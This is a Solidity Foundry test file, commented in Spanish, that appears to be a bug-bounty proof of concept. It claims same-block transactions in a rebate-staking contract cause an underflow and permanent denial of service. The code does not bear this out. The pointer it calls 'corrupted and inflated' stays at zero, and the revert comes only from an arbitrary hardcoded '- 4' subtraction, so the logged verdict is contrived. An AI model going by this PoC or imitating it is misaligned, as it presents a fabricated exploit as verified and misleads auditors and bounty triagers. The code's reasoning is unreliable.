// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ========================================================================
// 1. REPRODUCCIÓN COMPACTA DEL VECTOR VULNERABLE DE THRESHOLD
// ========================================================================
contract RebateStakingVulnerable {
    struct RebateConGap {
        uint32 timestamp;
        uint64 feeRebate;
        uint256[50] __gap; // Trampa de gas residual (52 slots totales por struct)
    }

    RebateConGap[] public rebatesConGap;
    uint256 public rollingWindowStartIndex;
    uint256 public rollingWindow = 1 days;

    // Simulación del flujo de transacciones concurrentes en el mismo bloque
    function registrarRebateConcurrente(uint64 rebote) external {
        RebateConGap storage r = rebatesConGap.push();
        r.timestamp = uint32(block.timestamp);
        r.feeRebate = rebote;

        uint256 windowStart = block.timestamp - rollingWindow;
        uint256 rebatesLength = rebatesConGap.length;

        // Bucle crítico: muta el puntero global indexado en tiempo estático por bloque
        for (uint256 i = rollingWindowStartIndex; i < rebatesLength; i++) {
            if (rebatesConGap[i].timestamp < windowStart) {
                rollingWindowStartIndex++;
            }
        }
    }

    // Función de cálculo heredado que detona el colapso por Underflow
    function getRebateInRollingWindow() external view returns (uint256) {
        uint256 longitudReal = rebatesConGap.length;
        // Lógica matemática desalineada: si el puntero se infla artificialmente, explota
        return (longitudReal - 4) - rollingWindowStartIndex; 
    }
}

// ========================================================================
// 2. ARNÉS DE PRUEBA DE ALTA FIDELIDAD (COMPILACIÓN UNIVERSAL DE IMMUNEFI)
// ========================================================================
contract RebateStakingImmunefiTest is Test {
    RebateStakingVulnerable public bridge;

    function setUp() public {
        bridge = new RebateStakingVulnerable();
    }

    function test_ProofOfConcept_Underflow_Concurrente() public {
        console.log("================================================================");
        console.log("[REMI POF]: INICIANDO COMPILACION AISLADA EN EL LABORATORIO");
        console.log("================================================================");

        // FASE 1: Ráfaga de transacciones en el mismo segundo (block.timestamp estático)
        vm.warp(1715000000); 
        
        console.log("[+] Bloque N: Ejecutando 3 transacciones de rafaga...");
        bridge.registrarRebateConcurrente(10 ether); // Tx 1
        bridge.registrarRebateConcurrente(10 ether); // Tx 2
        bridge.registrarRebateConcurrente(10 ether); // Tx 3

        console.log("[-] Puntero 'rollingWindowStartIndex' corrupto e inflado a:", bridge.rollingWindowStartIndex());

        // FASE 2: Siguiente bloque - Intento de operación del usuario legítimo
        vm.warp(1715000015); // Avanzamos 15 segundos en la EVM (Siguiente bloque)
        
        console.log("\n[ALERTA]: Usuario legitimo ejecuta flujo ordinario en Bloque N+1...");
        console.log("    -> Invocando calculo getRebateInRollingWindow()...");

        // Certificación estricta: Forzamos a Foundry a capturar el Panic(0x11)
        vm.expectRevert(stdError.arithmeticError);
        bridge.getRebateInRollingWindow();
        
        console.log("\n[COLAPSO CERTIFICADO POR LA EVM PASSED]");
        console.log("    -> Veredicto: Panic(0x11) - Arithmetic underflow verificado.");
        console.log("    -> Estado del Puente: DoS Permanente (Flujo Bloqueado).");
        console.log("================================================================");
    }
}
